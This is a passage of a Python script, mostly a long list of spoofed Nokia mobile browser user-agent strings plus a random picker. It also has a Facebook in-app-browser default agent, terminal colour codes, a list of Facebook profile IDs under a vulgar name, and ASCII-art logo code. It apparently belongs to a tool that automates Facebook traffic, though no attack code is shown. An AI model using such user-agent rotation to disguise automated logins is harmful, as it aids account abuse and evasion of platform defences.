"Mozilla/5.0 (Series40; Nokia309/08.22; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-06/07.29; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia5130c-2/07.97; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia112/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia203/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia308/07.55; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia114/03.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia301.1/08.02; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia2051/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia515.2/05.08; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia203/20.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia311/07.36; Profile/MIDP-1.2 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia306/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.48", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia210/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia2730c-1/10.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia112/03.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia203/20.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; NokiaC1-01/06.15; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia112/03.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia301/09.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208.1/04.06; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia2730c-1/10.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia306/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia308/08.13; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia208/ddECL3G_13w22; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; NokiaC2-03/07.29; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia112/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia114/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/11.57; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia112/03.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia502/14.0.4/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.20", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.1.0.0.62", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX3-02/le6.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.0.11.8", "Mozilla/5.0 (Series40; Nokia112/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia302/14.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/11.79; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia203/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/11.79; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia502/14.0.5/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.20", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-01/08.70; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia311/03.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia306/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia301/02.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.9", "Mozilla/5.0 (Series40; NokiaC2-03/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/32.0.3 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia302/14.53; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia203/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia308/05.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia515.2/05.08; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia210.2/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-00/04.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaAsha230DualSIM/14.0.5/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.20", "Mozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia203/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208.4/06.01; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia515.2/10.34; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia6300/07.30; Profile/MIDP-2.0 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; NokiaC1-01/06.15; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia205/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia6300/07.30; Profile/MIDP-2.0 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia208/09.05; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; NokiaX2-02/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia208/10.34; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-03/23.0.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia301.1/08.02; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.48", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia305/07.35; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/091.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.34 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia207.1/10.24; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia2052/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.34", "Mozilla/5.0 (Series40; Nokia307/07.55; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; NokiaX3-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Linux; Android 4.1.2; GT-P3110; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208.4/04.06; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45. browser: Nokia Browser OS40", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC3-01/07.53; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (series40; NokiaX2-02/10.90;Profile/MIDP-2.1 configuration/CLD-1.1) gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Symbian/3; Android 2.3.5; Nokia808PureView/113.010.1508; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.2.21 Mobile Safari/535.1", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Mozilla/5.0 (Series30Plus; Nokia225/20.10.11; Profile/Series30Plus Configuration/Series30Plus) Gecko/20100401 S40OviBrowser/3.8.1.2.06", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia305/07.35; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia515/07.01; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia208/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series30Plus; Nokia225/20.10.11; Profile/Series30Plus Configuration/Series30Plus) Gecko/20100401 S40OviBrowser/3.8.1.2.0612", "Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.48", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia2700-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45"])
	
	rand_ua = random.choice(uas)
	return rand_ua 
def UA():
	try:
		uas = open('ugent.txt','r').read()
	except (FileNotFoundError,IOError):
		uas = ("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]")
		open('ugent.txt','w').write(uas)
	
	return uas 

#--- warna
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    
pepek = ['100067807565861','100028434880529','romi.afrizal.102','romi.alfarabi','']

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)


#--- logo
def logo():
	time.sleep (0.01)
	print ('')
	print ('')
	jalan ('\x1b[1;97m                       _____---____ ')
	jalan ('\x1b[1;97m                    ________---_______ ')
	jalan ('\x1b[1;97m         ___-----           __      ----_ ')
	jalan ('\x1b[1;97m    ---______        ----                 \ ')
	jalan ('\x1b[1;97m                 --__    |             _____) ')
	jalan ('\x1b[1;97m                     -                /     \ ')
	jalan ('\x1b[1;97m          _____-----    ___--         \    /)\ ')
	jalan ('\x1b[1;97m    -----_____      ---____            \__/  / ')
	jalan ('\x1b[1;97m                 --__    \ --    _          /\ ')
	jalan ('\x1b[1;97m                      --__-__     \_____/   \_/\ ')
	jalan ('\x1b[1;97m                            ----|   /          | ')
